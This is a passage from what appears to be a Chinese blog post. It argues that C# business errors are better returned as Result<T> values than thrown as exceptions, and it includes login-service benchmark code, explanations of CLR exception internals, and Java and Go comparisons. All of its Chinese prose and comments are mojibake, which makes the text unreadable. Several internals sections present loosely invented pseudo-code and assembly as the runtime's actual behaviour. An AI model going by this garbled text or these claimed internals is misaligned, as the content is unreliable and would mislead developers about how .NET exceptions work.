    if (string.IsNullOrEmpty(path))
        throw new ArgumentNullException(nameof(path));  // â åæ°æ£æ¥
    
    if (!File.Exists(path))
        throw new FileNotFoundException($"æä»¶ä¸å­å¨: {path}");  // â ç³»ç»éè¯¯
    
    // å°è¯è¯»åæä»¶ï¼å¯è½æåºIOExceptionç­
    var content = File.ReadAllText(path);
}
</code></pre>
<p>å¼å¸¸æ¯ä¸ºçæ­£ç"å¼å¸¸æåµ"è®¾è®¡çï¼æ¯å¦ï¼</p>
<ul>
<li>ç³»ç»èµæºä¸å¯ç¨ï¼æä»¶ä¸å­å¨ãæ°æ®åºè¿æ¥å¤±è´¥ï¼</li>
<li>ç¨åºç¶æå¼å¸¸ï¼ç©ºæéãæ°ç»è¶çï¼</li>
<li>åæ°éªè¯å¤±è´¥ï¼åç½®æ¡ä»¶ä¸æ»¡è¶³ï¼</li>
</ul>
<h2 id="12-ä¸å¡é»è¾--å¼å¸¸æåµ">1.2 ä¸å¡é»è¾ â  å¼å¸¸æåµ</h2>
<p>ä¸å¡éè¯¯ï¼ç¨æ·ä¸å­å¨ãå¯ç éè¯¯ãä½é¢ä¸è¶³ï¼æ¯<strong>å¯é¢è§çæ­£å¸¸ä¸å¡æµç¨</strong>ï¼èä¸æ¯å¼å¸¸æåµã<br>
æä¸å¡éè¯¯ç¨å¼å¸¸å¤çï¼å°±åï¼</p>
<ul>
<li>ç¨"å°éè­¦æ¥"æ¥å¤ç"å®¶éæ²¡ç±³äº"</li>
<li>ç¨"æ¶é²è½¦"æ¥è¿é"å¿«éåè£¹"</li>
<li>ç¨"ææ¯å®¤"æ¥å¤ç"æååç§"</li>
</ul>
<p>è¿æ¯å¯¹å¼å¸¸æºå¶çä¸¥éæ»¥ç¨ï¼</p>
<h1 id="äºresultä¸å¡é»è¾çä¼ééçº§">äºãResult<t>ââä¸å¡é»è¾ç"ä¼ééçº§"</t></h1>
<h2 id="21-ä»ä¹æ¯result">2.1 ä»ä¹æ¯Result<t>ï¼</t></h2>
<p>ä¸ä¸ªç®åï¼å·å¤åºæ¬åè½çResultç±»å¦ä¸ï¼</p>
<pre><code class="language-csharp">public class Result&lt;T&gt;
{
    public bool Success { get; }
    public T? Value { get; }
    public string? Error { get; }
    
    private Result(T value) { Success = true; Value = value; Error = null; }
    private Result(string error) { Success = false; Value = default; Error = error; }
    
    public static Result&lt;T&gt; Ok(T value) =&gt; new(value);
    public static Result&lt;T&gt; Fail(string error) =&gt; new(error);
}
</code></pre>
<h2 id="22-å¦ä½æ­£ç¡®ä½¿ç¨result">2.2 å¦ä½æ­£ç¡®ä½¿ç¨Result<t>ï¼</t></h2>
<pre><code class="language-csharp">public Result&lt;User&gt; Login(string username, string password)
{
    if (string.IsNullOrEmpty(username))
        return Result&lt;User&gt;.Fail("ç¨æ·åä¸è½ä¸ºç©º");  // â æç¡®è¿åä¸å¡éè¯¯
    
    if (string.IsNullOrEmpty(password))
        return Result&lt;User&gt;.Fail("å¯ç ä¸è½ä¸ºç©º");    // â æç¡®è¿åä¸å¡éè¯¯
    
    var user = FindUser(username);
    if (user == null)
        return Result&lt;User&gt;.Fail("ç¨æ·ä¸å­å¨");      // â æç¡®è¿åä¸å¡éè¯¯
    
    if (!VerifyPassword(user, password))
        return Result&lt;User&gt;.Fail("å¯ç éè¯¯");        // â æç¡®è¿åä¸å¡éè¯¯
    
    return Result&lt;User&gt;.Ok(user);                   // â æç¡®è¿åæå
}
</code></pre>
<h1 id="ä¸æ§è½å¯¹å³--å è¿ç¢¾åçæ§è½å·®è·">ä¸ãæ§è½å¯¹å³ ââ å è¿ç¢¾åçæ§è½å·®è·</h1>
<h2 id="31-é¨åæµè¯ä»£ç ">3.1 é¨åæµè¯ä»£ç </h2>
<p>é¡¹ç®ç¯å¢ï¼</p>
<pre><code>&lt;Project Sdk="Microsoft.NET.Sdk"&gt;
	&lt;PropertyGroup&gt;
		&lt;OutputType&gt;Exe&lt;/OutputType&gt;
		&lt;TargetFramework&gt;net8.0&lt;/TargetFramework&gt;
		&lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
		&lt;Nullable&gt;enable&lt;/Nullable&gt;
		&lt;LangVersion&gt;latest&lt;/LangVersion&gt;
	&lt;/PropertyGroup&gt;
&lt;/Project&gt;
</code></pre>
<p>é¨åæµè¯ä»£ç ï¼</p>
<pre><code class="language-csharp"> public class LoginService
 {
     private readonly Dictionary&lt;string, User&gt; _users = new()
     {
         ["valid_user"] = new User { Id = 1, Username = "valid_user" }
     };

    
     public User LoginWithException(string username, string password)
     {
         if (!_users.TryGetValue(username, out var user))
             throw new BusinessException("ç¨æ·ä¸å­å¨");

         if (password != "correct_password")
             throw new BusinessException("å¯ç éè¯¯");

         return user;
     }

    
     public Result&lt;User&gt; LoginWithResult(string username, string password)
     {
         if (!_users.TryGetValue(username, out var user))
             return Result&lt;User&gt;.Fail("ç¨æ·ä¸å­å¨");

         if (password != "correct_password")
             return Result&lt;User&gt;.Fail("å¯ç éè¯¯");

         return Result&lt;User&gt;.Ok(user);
     }
 }
</code></pre>
<pre><code class="language-csharp">public class PerformanceTester
{
    private readonly LoginService _service = new();
    private readonly Random _random = new(42);

    public void RunAllTests(int iterations = 1000000)
    {
        Console.WriteLine($"æ§è½å¯¹æ¯æµè¯ - è¿­ä»£æ¬¡æ°: {iterations:N0}");
        Console.WriteLine("=".PadRight(60, '='));

        // æµè¯1ï¼æåè·¯å¾ï¼æ­£å¸¸æåµï¼
        TestSuccessPath(iterations);

        // æµè¯2ï¼å¤±è´¥è·¯å¾ï¼éè¯¯æåµï¼
        TestErrorPath(iterations);

        // æµè¯3ï¼æ··åè·¯å¾ï¼30%æåçï¼
        TestMixedPath(iterations, 0.3);
    }

    private void TestSuccessPath(int iterations)
    {
        Console.WriteLine("\næµè¯1ï¼æåè·¯å¾ï¼100%æåï¼");

        // å¼å¸¸æ¹å¼
        var exceptionTime = Measure(() =&gt;
        {
            try
            {
                _service.LoginWithException("valid_user", "correct_password");
            }
            catch
            {
                // ä¸åºè¯¥åç
            }
        }, iterations, "å¼å¸¸æ¹å¼");

        // Resultæ¹å¼
        var resultTime = Measure(() =&gt;
        {
            var result = _service.LoginWithResult("valid_user", "correct_password");
            if (!result.Success)
            {
                // ä¸åºè¯¥åç
            }
        }, iterations, "Resultæ¹å¼");

        PrintComparison(exceptionTime, resultTime);
    }

    private void TestErrorPath(int iterations)
    {
        Console.WriteLine("\næµè¯2ï¼å¤±è´¥è·¯å¾ï¼100%å¤±è´¥ï¼");

        // å¼å¸¸æ¹å¼
        var exceptionTime = Measure(() =&gt;
        {
            try
            {
                _service.LoginWithException("invalid_user", "wrong_password");
            }
            catch (BusinessException)
            {
                // é¢æå¼å¸¸
            }
        }, iterations, "å¼å¸¸æ¹å¼");

        // Resultæ¹å¼
        var resultTime = Measure(() =&gt;
        {
            var result = _service.LoginWithResult("invalid_user", "wrong_password");
            if (result.Success)
            {
                // ä¸åºè¯¥åç
            }
        }, iterations, "Resultæ¹å¼");

        PrintComparison(exceptionTime, resultTime);
    }

    private void TestMixedPath(int iterations, double successRate)
    {
        Console.WriteLine($"\næµè¯3ï¼æ··åè·¯å¾ï¼{successRate:P0}æåçï¼");

        // åå¤æµè¯æ°æ®
        var testData = new (string user, string pwd, bool shouldSucceed)[iterations];
        for (int i = 0; i &lt; iterations; i++)
        {
            testData[i] = _random.NextDouble() &lt; successRate
                ? ("valid_user", "correct_password", true)   // æå
                : ("invalid_user", "wrong_password", false); // å¤±è´¥
        }

        // å¼å¸¸æ¹å¼
        var exceptionTime = MeasureMixed(testData, true, "å¼å¸¸æ¹å¼");

        // Resultæ¹å¼
        var resultTime = MeasureMixed(testData, false, "Resultæ¹å¼");

        PrintComparison(exceptionTime, resultTime);
    }

    private static long Measure(Action action, int iterations, string testName)
    {
        // é¢ç­
        for (int i = 0; i &lt; 1000; i++) action();

        GC.Collect();
        GC.WaitForPendingFinalizers();
        GC.Collect();

        var sw = Stopwatch.StartNew();
        for (int i = 0; i &lt; iterations; i++)
        {
            action();
        }
        sw.Stop();

        var opsPerSecond = iterations / (sw.ElapsedMilliseconds / 1000.0);
        Console.WriteLine($"  {testName}: {sw.ElapsedMilliseconds,8}ms ({opsPerSecond,12:N0} ops/s)");

        return sw.ElapsedMilliseconds;
    }

    private long MeasureMixed(
        (string user, string pwd, bool shouldSucceed)[] testData,
        bool useException,
        string testName)
    {
        // é¢ç­
        for (int i = 0; i &lt; Math.Min(1000, testData.Length); i++)
        {
            var (user, pwd, _) = testData[i];
            if (useException)
            {
                try
                {
                    _service.LoginWithException(user, pwd);
                }
                catch { }
            }
            else
            {
                _service.LoginWithResult(user, pwd);
            }
        }

        GC.Collect();
        GC.WaitForPendingFinalizers();
        GC.Collect();

        var sw = Stopwatch.StartNew();

        if (useException)
        {
            for (int i = 0; i &lt; testData.Length; i++)
            {
                var (user, pwd, _) = testData[i];
                try
                {
                    _service.LoginWithException(user, pwd);
                }
                catch { }
            }
        }
        else
        {
            for (int i = 0; i &lt; testData.Length; i++)
            {
                var (user, pwd, _) = testData[i];
                _service.LoginWithResult(user, pwd);
            }
        }

        sw.Stop();

        var opsPerSecond = testData.Length / (sw.ElapsedMilliseconds / 1000.0);
        Console.WriteLine($"  {testName}: {sw.ElapsedMilliseconds,8}ms ({opsPerSecond,12:N0} ops/s)");

        return sw.ElapsedMilliseconds;
    }

    private static void PrintComparison(long exceptionTime, long resultTime)
    {
        var speedup = exceptionTime / (double)resultTime;
        var improvement = (exceptionTime - resultTime) * 100.0 / exceptionTime;

        if (speedup &gt; 1)
        {
            Console.WriteLine($"Resultæ¯Exceptionå¿« {speedup:F1}xï¼æ§è½æå {improvement:F1}%");
        }
        else
        {
            Console.WriteLine($"å·®å¼ä¸å¤§: {speedup:F2}x");
        }
    }
}
</code></pre>
<h2 id="32-æµè¯ç»æè§¦ç®æå¿">3.2 æµè¯ç»æï¼è§¦ç®æå¿</h2>
<p>åä¸å¾ï¼çæµè¯ç»æ(<strong>åºäºRELEASEæ¨¡å¼ç¼è¯</strong>)ï¼</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1553709/202601/1553709-20260120175226554-1542544296.png" class="lazyload"></p>
<h2 id="33-å¹¶ååºæ¯ä¸æ§è½å·®è·ä¾æ§ä¸å¿ç´è§">3.3 å¹¶ååºæ¯ä¸ï¼æ§è½å·®è·ä¾æ§ä¸å¿ç´è§</h2>
<p>å¹¶åæµè¯æ ¸å¿ä»£ç ï¼</p>
<pre><code class="language-csharp">/// &lt;summary&gt;
/// // å¹¶åæµè¯ç»æç±»
/// &lt;/summary&gt;
public class ConcurrentTestResult
{
    public int Concurrency { get; set; }
    public long ExceptionTime { get; set; }
    public long ResultTime { get; set; }
    public double ExceptionOpsPerSecond { get; set; }
    public double ResultOpsPerSecond { get; set; }
}


/// &lt;summary&gt;
/// å¹¶åæµè¯å¨
/// &lt;/summary&gt;
public class ConcurrentPerformanceTester
{
    private readonly LoginService _service = new();
    private readonly Random _random = new(42);

    private readonly double _errorRate = 0.3;


    public async Task RunConcurrentTests(int totalIterations = 1000000)
    {
        Console.WriteLine("\nå¹¶åæ§è½æµè¯ - æ»è¿­ä»£æ¬¡æ°: {0:N0} - éè¯¯çï¼{1:P0}", totalIterations, _errorRate);
        Console.WriteLine("=".PadRight(60, '='));

        var concurrencyLevels = new[] { 4, 8, 16, 32, 64, 128, 256 };

        foreach (var concurrency in concurrencyLevels)
        {
            Console.WriteLine($"\nå¹¶åæ°: {concurrency}");

            // é¢ç­
            await Warmup(concurrency);

            // å¼å¸¸æ¹å¼å¹¶åæµè¯ï¼30%éè¯¯çæ¨¡æçå®åºæ¯ï¼
            var exceptionTime = await RunConcurrentExceptionTest(
                concurrency,
                totalIterations,
                errorRate: _errorRate
            );

            // Resultæ¹å¼å¹¶åæµè¯
            var resultTime = await RunConcurrentResultTest(
                concurrency,
                totalIterations,
                errorRate: _errorRate
            );

            var exceptionOps = totalIterations / (exceptionTime / 1000.0);
            var resultOps = totalIterations / (resultTime / 1000.0);
            var speedup = exceptionTime / (double)resultTime;

            Console.WriteLine($"  å¼å¸¸: {exceptionTime,5}ms ({exceptionOps,8:N0} ops/s)");
            Console.WriteLine($"  Result: {resultTime,5}ms ({resultOps,8:N0} ops/s)");
            Console.WriteLine($"  Resultå¿« {speedup:F1}x");
        }
    }

    /// &lt;summary&gt;
    /// å¹¶åå¼å¸¸æµè¯
    /// &lt;/summary&gt;
    /// &lt;param name="concurrency"&gt;&lt;/param&gt;
    /// &lt;param name="totalIterations"&gt;&lt;/param&gt;
    /// &lt;param name="errorRate"&gt;&lt;/param&gt;
    /// &lt;returns&gt;&lt;/returns&gt;
    private async Task&lt;long&gt; RunConcurrentExceptionTest(
        int concurrency,
        int totalIterations,
        double errorRate)
    {
        var iterationsPerTask = totalIterations / concurrency;
        var tasks = new Task[concurrency];

        var sw = Stopwatch.StartNew();

        for (int i = 0; i &lt; concurrency; i++)
        {
            // æ¯ä¸ªä»»å¡ä½¿ç¨èªå·±çéæºå®ä¾ï¼é¿åç«äº
            var taskRandom = new Random(_random.Next());
            tasks[i] = Task.Run(() =&gt;
            {
                for (int j = 0; j &lt; iterationsPerTask; j++)
                {
                    // ä¸ºæ¯æ¬¡è¿­ä»£çææµè¯æ°æ®ï¼é¿åç´¢å¼é®é¢
                    var (user, pwd) = GenerateTestDataForIteration(taskRandom, errorRate);
                    try
                    {
                        _service.LoginWithException(user, pwd);
                    }
                    catch (BusinessException)
                    {
                        // é¢æå¼å¸¸
                    }
                }
            });
        }

        await Task.WhenAll(tasks);
        sw.Stop();

        return sw.ElapsedMilliseconds;
    }

    /// &lt;summary&gt;
    /// å¹¶åResultæµè¯
    /// &lt;/summary&gt;
    /// &lt;param name="concurrency"&gt;&lt;/param&gt;
    /// &lt;param name="totalIterations"&gt;&lt;/param&gt;
    /// &lt;param name="errorRate"&gt;&lt;/param&gt;
    /// &lt;returns&gt;&lt;/returns&gt;
    private async Task&lt;long&gt; RunConcurrentResultTest(
        int concurrency,
        int totalIterations,
        double errorRate)
    {
        var iterationsPerTask = totalIterations / concurrency;
        var tasks = new Task[concurrency];

        var sw = Stopwatch.StartNew();

        for (int i = 0; i &lt; concurrency; i++)
        {
            var taskRandom = new Random(_random.Next());
            tasks[i] = Task.Run(() =&gt;
            {
                for (int j = 0; j &lt; iterationsPerTask; j++)
                {
                    var (user, pwd) = GenerateTestDataForIteration(taskRandom, errorRate);
                    var result = _service.LoginWithResult(user, pwd);
                    // ä¸éè¦é¢å¤å¤çï¼Resultå·²ç»åå«äºæå/å¤±è´¥ç¶æ
                }
            });
        }

        await Task.WhenAll(tasks);
        sw.Stop();

        return sw.ElapsedMilliseconds;
    }

    /// &lt;summary&gt;
    /// ä¸ºåæ¬¡è¿­ä»£çææµè¯æ°æ®
    /// &lt;/summary&gt;
    /// &lt;param name="random"&gt;&lt;/param&gt;
    /// &lt;param name="errorRate"&gt;&lt;/param&gt;
    /// &lt;returns&gt;&lt;/returns&gt;
    private static (string user, string pwd) GenerateTestDataForIteration(Random random, double errorRate)
    {
        if (random.NextDouble() &gt; errorRate)
        {
            // æåæ¡ä¾
            return ("valid_user", "correct_password");
        }
        else
        {
            // å¤±è´¥æ¡ä¾ - éæºéæ©å¤±è´¥ç±»å
            if (random.Next(2) == 0)
                return ("invalid_user", "any_password");  // ç¨æ·ä¸å­å¨
            else
                return ("valid_user", "wrong_password");   // å¯ç éè¯¯
        }
    }

    /// &lt;summary&gt;
    /// é¢ç­
    /// &lt;/summary&gt;
    /// &lt;param name="concurrency"&gt;&lt;/param&gt;
    /// &lt;param name="errorRate"&gt;&lt;/param&gt;
    /// &lt;returns&gt;&lt;/returns&gt;
    private async Task Warmup(int concurrency, double errorRate = 0.3)
    {
        var warmupTasks = new Task[Math.Min(concurrency, 4)];

        for (int i = 0; i &lt; warmupTasks.Length; i++)
        {
            warmupTasks[i] = Task.Run(() =&gt;
            {
                var taskRandom = new Random(_random.Next());
                for (int j = 0; j &lt; 100; j++)
                {
                    var (user, pwd) = GenerateTestDataForIteration(taskRandom, errorRate);
                    try
                    {
                        _service.LoginWithException(user, pwd);
                    }
                    catch { }

                    _service.LoginWithResult(user, pwd);
                }
            });
        }

        await Task.WhenAll(warmupTasks);
        GC.Collect();
        GC.WaitForPendingFinalizers();
        GC.Collect();
    }
}
</code></pre>
<p>å¹¶åæµè¯ç»æï¼<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1553709/202601/1553709-20260120180104863-50492398.png" class="lazyload"></p>
<p>ä¸è¿°æµè¯å¯è½å¹¶ä¸ä¸¥è°¨åæå¨ï¼ä½æ¯æ´é²åºæ¥çé®é¢è¿æ¯éå¸¸ææ¾çï¼</p>
<ul>
<li>å¨100%å¤±è´¥åºæ¯ä¸ï¼Resultæ¯Exceptionå¿«äºå·®ä¸å¤200å</li>
<li>æ¥è¿å®éä¸å¡åºæ¯ç30%éè¯¯çæåµä¸ï¼Resultæ¯Exceptionä¹å¿«äº160å¤å</li>
<li>å¹¶ååºæ¯ä¸ï¼æ§è½å·®è·ä¹ææ¥è¿ç¾å</li>
</ul>
<h1 id="åä¸ºä»ä¹å¼å¸¸å¨ä¸å¡åºæ¯ä¸å¦æ­¤æè´µ">åãä¸ºä»ä¹å¼å¸¸å¨ä¸å¡åºæ¯ä¸å¦æ­¤"æè´µ"ï¼</h1>
<h2 id="41-clrå¼å¸¸æºå¶çåºå±åç">4.1 CLRå¼å¸¸æºå¶çåºå±åç</h2>
<h3 id="411-å¼å¸¸å¯¹è±¡çæé è¿ç¨">4.1.1 å¼å¸¸å¯¹è±¡çæé è¿ç¨</h3>
<p>å½æä»¬å¨C#ä¸­æåºå¼å¸¸æ¶ï¼çä¼¼ç®åçä¸è¡ä»£ç ï¼èåå´åçäºå¤§éå¤æçæä½ï¼</p>
<pre><code class="language-csharp">throw new BusinessException("ç¨æ·ä¸å­å¨");
</code></pre>
<p>è¿ä¸ªæä½çå®éæ§è¡æµç¨å¦ä¸ï¼</p>
<pre><code class="language-csharp">// ä¼ªä»£ç å±ç¤ºå¼å¸¸æé çå®éå¼é
public static Exception CreateException(string message)
{
    // 1. å åéï¼å¼å¸¸å¯¹è±¡æ¬èº«ï¼è³å°40-64å­èï¼
    var exception = RuntimeHelpers.AllocateException(typeof(BusinessException));
    
    // 2. å­æ®µåå§åï¼è°ç¨æé å½æ°é¾ï¼
    exception._message = message;  // å­ç¬¦ä¸²åé
    exception._stackTrace = null;
    exception._innerException = null;
    exception._helpURL = null;
    exception._source = null;
    
    // 3. æè·è°ç¨å æ ï¼ææè´µçé¨åï¼ï¼
    exception.CaptureStackTrace();
    
    return exception;
}

private void CaptureStackTrace()
{
    // 4. è·åå½åçº¿ç¨çè°ç¨å æ 
    var frames = new StackFrame[64];  // åéæ°ç»
    var frameCount = StackTraceHelper.CaptureStackTrace(
        frames, 0,  // èµ·å§ä½ç½®
        false,      // æ¯å¦éè¦æä»¶ä¿¡æ¯
        null);      // å¼å¸¸å¯¹è±¡æ¬èº«
    
    // 5. æ ¼å¼åæå­ç¬¦ä¸²ï¼å¯è½æ¶åå¤§éå­ç¬¦ä¸²æä½ï¼
    this._stackTrace = FormatStackTrace(frames, frameCount);
}
</code></pre>
<h3 id="412-å æ è·è¸ªççå®ä»£ä»·">4.1.2 å æ è·è¸ªççå®ä»£ä»·</h3>
<p>è®©æä»¬æ·±å¥çç<code>CaptureStackTrace</code>å°åºåäºä»ä¹ï¼</p>
<pre><code class="language-csharp">// Windowsä¸çå®éå®ç°ï¼ç®åï¼
internal static unsafe int CaptureStackTrace(
    StackFrame[] frames, 
    int startIndex,
    bool needFileInfo,
    Exception exception)
{
    // 1. è°ç¨ç³»ç»APIè·åå½åçº¿ç¨çä¸ä¸æ
    CONTEXT context;
    RtlCaptureContext(&amp;context);
    
    // 2. éåè°ç¨å æ ï¼æ§è½ææï¼ï¼
    STACKFRAME64 stackFrame = new STACKFRAME64();
    while (StackWalk64(
        IMAGE_FILE_MACHINE_AMD64,
        GetCurrentProcess(),
        GetCurrentThread(),
        &amp;stackFrame,
        &amp;context,
        null,
        SymFunctionTableAccess64,
        SymGetModuleBase64,
        null))
    {
        // 3. è§£ææ¯ä¸ªæ å¸§çä¿¡æ¯
        frames[frameCount++] = new StackFrame(
            stackFrame.AddrPC.Offset,
            needFileInfo ? GetSourceInfo(stackFrame) : null);
        
        if (frameCount &gt;= frames.Length) break;
    }
    
    return frameCount;
}
</code></pre>
<p>å³é®ç¹ï¼</p>
<ul>
<li>æ¯ä¸ªthrowæä½é½è¦éåæ´ä¸ªè°ç¨å æ </li>
<li>å æ éåæ¶åå¤ä¸ªç³»ç»è°ç¨ååå­è®¿é®</li>
<li>éè¦å°åå­å°åè§£æä¸ºæ¹æ³åãæä»¶åãè¡å·ç­</li>
<li>å¨Releaseæ¨¡å¼ä¸ï¼JITä¼åå¯è½ä¼å½±åå æ ä¿¡æ¯</li>
</ul>
<h3 id="413-jitåaotç¼è¯å¯¹å¼å¸¸çå½±å">4.1.3 JITåAOTç¼è¯å¯¹å¼å¸¸çå½±å</h3>
<pre><code class="language-csharp">// èèä»¥ä¸ä»£ç 
public int Process(int value)
{
    try
    {
        return ProcessValue(value);  // å¯è½æåºå¼å¸¸
    }
    catch (Exception)
    {
        return -1;
    }
}

// JITç¼è¯å¨éè¦çæï¼
// 1. æ­£å¸¸æ§è¡è·¯å¾çä»£ç 
// 2. å¼å¸¸å¤çè¡¨ï¼EHè¡¨ï¼
// 3. å æ å±å¼ä»£ç 
// 4. finallyåæ§è¡é»è¾ï¼å¦ææï¼
</code></pre>
<p>EHè¡¨çç»æï¼</p>
<pre><code>Method Exception Handling Table:
Start   Length  Handler Type    Class           Filter
0x0000  0x0020  0x0030  CLAUSE  Exception       null
</code></pre>
<p>æ¯ä¸ªtry-catchåé½ä¼å¨æ¹æ³çåæ°æ®ä¸­æ·»å EHè¡¨æ¡ç®ï¼å¢å æ¹æ³å¤§å°åå è½½æ¶é´ã</p>
<h2 id="42-å¼å¸¸å¤ççåå­åéç»è">4.2 å¼å¸¸å¤ççåå­åéç»è</h2>
<h3 id="421-å¼å¸¸å¯¹è±¡çåå­å¸å±">4.2.1 å¼å¸¸å¯¹è±¡çåå­å¸å±</h3>
<pre><code class="language-csharp">// Exceptionç±»çç®ååå­å¸å±
class Exception
{
    // å¯¹è±¡å¤´ï¼8-16å­èï¼
    MethodTable* _methodTable;  // 8å­è
    // åæ­¥åç´¢å¼ï¼å¯éï¼
    
    // å®ä¾å­æ®µ
    string _message;           // 8å­èï¼å¼ç¨ï¼
    IDictionary _data;         // 8å­èï¼éå¸¸ä¸ºnullï¼
    Exception _innerException; // 8å­è
    string _helpURL;          // 8å­è
    string _source;           // 8å­è
    string _stackTrace;       // 8å­èï¼å­ç¬¦ä¸²ï¼å®éåéæ´å¤§ï¼
    object _stackTraceString; // 8å­èï¼å¯è½ä¸åæ ¼å¼ï¼
    object _remoteStackTrace; // 8å­è
    int _remoteStackIndex;    // 4å­è
    int _HResult;             // 4å­è
    
    // æ»å±ï¼è³å°80å­èï¼64ä½ç³»ç»ï¼
    // å ä¸å­ç¬¦ä¸²åå®¹ï¼å¯è½æ°ç¾å°æ°åå­è
}
</code></pre>
<h3 id="422-gcçå½±å">4.2.2 GCçå½±å</h3>
<pre><code class="language-csharp">// é«é¢æåºå¼å¸¸ä¼æ¾èå½±åGC
public void TestExceptionGC()
{
    var list = new List&lt;Exception&gt;();
    
    for (int i = 0; i &lt; 10000; i++)
    {
        try
        {
            throw new Exception($"Error {i}");
        }
        catch (Exception ex)
        {
            list.Add(ex);  // å¤§éå¯¹è±¡è¿å¥ç¬¬0ä»£å 
        }
    }
}

</code></pre>
<p>ä¸è¿°ä»£ç ä¼å¯¼è´:</p>
<ul>
<li>è§¦åé¢ç¹çGen0 GC</li>
<li>å¦æexè¢«é¿æ¶é´å¼ç¨ï¼å¯è½è¿å¥Gen1/Gen2</li>
<li>å¢å GCæåæ¶é´</li>
<li>éä½ç¼å­å±é¨æ§</li>
</ul>
<h2 id="43-cpuçº§å«çæ§è½å½±å">4.3 CPUçº§å«çæ§è½å½±å</h2>
<h3 id="431-ç°ä»£cpuçå¼å¸¸å¤çå¼é">4.3.1 ç°ä»£CPUçå¼å¸¸å¤çå¼é</h3>
<pre><code class="language-assembly">; x64æ±ç¼å±é¢çå¼å¸¸å¤ç
; æ­£å¸¸è·¯å¾ï¼
process_value:
    mov eax, [rcx]      ; å è½½å¼
    add eax, 100        ; è®¡ç®
    ret                 ; è¿å
    
; å¼å¸¸è·¯å¾ï¼
throw_exception:
    ; 1. ä¿å­ææå¯å­å¨å°å æ 
    push rbx
    push rbp
    push r12
    push r13
    push r14
    push r15
    sub rsp, 28h        ; åéå æ ç©ºé´
    
    ; 2. è°ç¨å¼å¸¸æé å½æ°
    call Exception..ctor
    
    ; 3. è®¾ç½®SEHï¼ç»æåå¼å¸¸å¤çï¼
    mov [rsp+20h], rcx  ; ä¿å­å¼å¸¸å¯¹è±¡
    call __CxxThrowException@8
    
    ; 4. æ¸çå æ 
    add rsp, 28h
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbp
    pop rbx
</code></pre>
<p>CPUå±é¢çé®é¢:</p>
<ul>
<li><strong>åæ¯é¢æµå¤±è´¥</strong>ï¼å¼å¸¸è·¯å¾å¾å°æ§è¡ï¼CPUåæ¯é¢æµå¨é¾ä»¥ä¼å</li>
<li><strong>ç¼å­å¤±æ</strong>ï¼å¼å¸¸å¤çä»£ç éå¸¸ä¸å¨æä»¤ç¼å­ä¸­</li>
<li><strong>æµæ°´çº¿åé¡¿</strong>ï¼å¼å¸¸å¤çéè¦ä¿å­/æ¢å¤å¤§éå¯å­å¨ç¶æ</li>
<li><strong>åå­è®¿é®æ¨¡å¼å·®</strong>ï¼EHè¡¨æ¥æ¾å¯¼è´éæºåå­è®¿é®</li>
</ul>
<h3 id="432-å¯¹æ¯æ­£å¸¸è¿ååå¼å¸¸è¿å">4.3.2 å¯¹æ¯æ­£å¸¸è¿ååå¼å¸¸è¿å</h3>
<pre><code class="language-csharp">// Result&lt;T&gt;çæ­£å¸¸è¿åè·¯å¾
return Result&lt;User&gt;.Fail("ç¨æ·ä¸å­å¨");
// æ±ç¼ï¼
; 1. æé Resultå¯¹è±¡ï¼å¯è½å¨æ ä¸ï¼
; 2. è®¾ç½®Success=false
; 3. è®¾ç½®Errorå­æ®µ
; 4. è¿åï¼æ®éretæä»¤ï¼

// å¼å¸¸è¿åè·¯å¾
throw new BusinessException("ç¨æ·ä¸å­å¨");
// æ±ç¼ï¼
; 1. å åéå¼å¸¸å¯¹è±¡
; 2. æè·å æ è·è¸ª
; 3. è®¾ç½®SEHå¸§
; 4. è°ç¨kernel32!RaiseException
; 5. å æ å±å¼
; 6. æ¥æ¾catchå
; 7. æ§è¡catchåä»£ç 
</code></pre>
<h2 id="44-å¯¹æ¯å¶ä»ç¼ç¨è¯­è¨">4.4 å¯¹æ¯å¶ä»ç¼ç¨è¯­è¨</h2>
<h3 id="441-javaçå¼å¸¸æºå¶">4.4.1 Javaçå¼å¸¸æºå¶</h3>
<pre><code class="language-java">// Javaçå¼å¸¸ä½¿ç¨çèµ·æ¥åC#ç¸ä¼¼
public User login(String username, String password) 
    throws UserNotFoundException, InvalidPasswordException
{
    User user = findUser(username);
    if (user == null) {
        throw new UserNotFoundException("ç¨æ·ä¸å­å¨");
    }
    if (!verifyPassword(user, password)) {
        throw new InvalidPasswordException("å¯ç éè¯¯");
    }
    return user;
}
</code></pre>
<p>Javaå¼å¸¸çç¹ç¹ï¼<br>
1.æ£æ¥åå¼å¸¸ï¼Checked Exceptionï¼ï¼å¼ºå¶å¤çæå£°æ<br>
2.æ§è½å¼éä¸C#ç±»ä¼¼ï¼åæ ·éè¦æè·å æ è·è¸ª<br>
3.JVMçä¼åï¼HotSpot JVMææ´æççå¼å¸¸ä¼å:</p>
<ul>
<li>åèç¼å­ï¼Inline Cacheï¼</li>
<li>æ ä¸æ¿æ¢ï¼On-Stack Replacementï¼</li>
<li>ä½ä¸å¡å¼å¸¸ä»ç¶æè´µ</li>
</ul>
<p><strong>éè¦åºå«ï¼</strong></p>
<pre><code class="language-java">// Java 14+å¼å¥äºRecordsï¼ä½å¼å¸¸å¼éä¾æ§
public record Result&lt;T&gt;(T value, String error) {
    public boolean isSuccess() { return error == null; }
}

// Javaç¤¾åºä¹å¨è½¬åResultæ¨¡å¼ï¼ç¹å«æ¯ååºå¼ç¼ç¨
public Mono&lt;User&gt; login(String username, String password) {
    return Mono.fromCallable(() -&gt; findUser(username))
        .switchIfEmpty(Mono.error(new UserNotFoundException()))
        .filter(user -&gt; verifyPassword(user, password))
        .switchIfEmpty(Mono.error(new InvalidPasswordException()));
}
</code></pre>
<h3 id="442-goçéè¯¯å¤çå²å­¦">4.4.2 Goçéè¯¯å¤çå²å­¦</h3>
<pre><code class="language-go">// Goçéè¯¯å¤çï¼æ¾å¼è¿åéè¯¯
func Login(username, password string) (*User, error) {
    user, err := findUser(username)
    if err != nil {
        return nil, fmt.Errorf("æ¥æ¾ç¨æ·å¤±è´¥: %w", err)
    }
    
    if !verifyPassword(user, password) {
        return nil, errors.New("å¯ç éè¯¯")
    }
    
    return user, nil
}

// è°ç¨æ¹å¿é¡»æ¾å¼å¤çéè¯¯
user, err := Login("test", "123")
if err != nil {
    // å¤çéè¯¯
    switch {
    case strings.Contains(err.Error(), "å¯ç éè¯¯"):
        // ç¹å®å¤ç
    default:
        // éç¨å¤ç
    }
}
</code></pre>
<p>Goçè®¾è®¡éæ©ï¼</p>
<ul>
